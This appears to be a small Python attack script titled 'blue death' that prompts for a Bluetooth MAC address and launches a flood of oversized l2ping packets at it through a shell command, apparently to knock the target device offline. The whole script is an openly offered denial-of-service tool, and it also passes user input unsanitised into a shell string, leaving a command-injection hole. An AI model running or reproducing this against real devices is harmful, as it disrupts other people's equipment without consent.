import color
import subprocess
print("""
 _     _                  _            _   _     
| |   | |                | |          | | | |    
| |__ | |_   _  ___    __| | ___  __ _| |_| |__  
| '_ \| | | | |/ _ \  / _` |/ _ \/ _` | __| '_ \ 
| |_) | | |_| |  __/ | (_| |  __/ (_| | |_| | | |
|_.__/|_|\__,_|\___|  \__,_|\___|\__,_|\__|_| |_|
                                                 
""")

mac = input("MAC: ")

xterm_1 = "l2ping -i hci0 -s 600 -f %s &" % (mac)
subprocess.Popen(xterm_1, shell=True)


